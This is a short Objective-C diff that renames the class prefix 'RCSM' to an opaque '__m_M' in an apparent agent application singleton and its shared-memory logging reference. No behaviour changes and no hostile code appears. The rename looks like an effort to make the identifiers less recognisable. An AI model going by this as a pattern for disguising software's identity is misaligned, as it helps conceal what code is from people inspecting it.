@@ -18,11 +18,11 @@
 
 //#define DEBUG
 
-static RCSMAgentApplication *sharedAgentApplication = nil;
-extern RCSMSharedMemory     *mSharedMemoryLogging;
+static __m_MAgentApplication *sharedAgentApplication = nil;
+extern __m_MSharedMemory     *mSharedMemoryLogging;
 
 
-@implementation RCSMAgentApplication
+@implementation __m_MAgentApplication
 
 @synthesize isAppStarted;
 
@@ -30,7 +30,7 @@ extern RCSMSharedMemory     *mSharedMemoryLogging;
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMAgentApplication *)sharedInstance
++ (__m_MAgentApplication *)sharedInstance
 {
   @synchronized(self)
   {
